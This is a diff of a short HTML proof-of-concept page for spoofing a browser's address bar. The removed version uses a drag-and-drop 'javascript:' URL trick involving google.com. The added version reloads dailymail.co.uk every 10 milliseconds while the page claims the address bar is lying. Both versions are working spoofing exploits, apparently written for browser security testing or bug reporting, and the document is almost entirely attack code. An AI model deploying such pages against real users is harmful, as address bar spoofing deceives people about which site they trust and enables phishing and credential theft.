@@ -1,17 +1,9 @@
-<title>
-Address Bar Spoof
-</title>
-<body>
-<h1><a href="http://www.google.com:1010" id="a">DRAG ME TO Omnibox</a></h1>
-</body>
+<title>Whatever</title>
+<h1>Address bar says dailymail.co.uk – this is NOT dailymail.co.uk</h1>
 <script>
-var spoof_url = 'www.google.com';
-spoof_url = 'javascript:' + spoof_url;
-ondragstart= function() {
-  event.dataTransfer.setData('text/plain',spoof_url);
+function f()
+{
+    location="http://www.dailymail.co.uk/home/index.html?random="+Math.random();
 }
-ondragend = function(){
-  document.title = 'Done';
-  document.write('<title>Google</title><h1>I am not www.google.com at all!</h1><input autofocus onfocus="setTimeout(function(){window.location.assign(\"http://www.google.com:1010\");}, 5000);">');
-}
+setInterval("f()",10);
 </script>
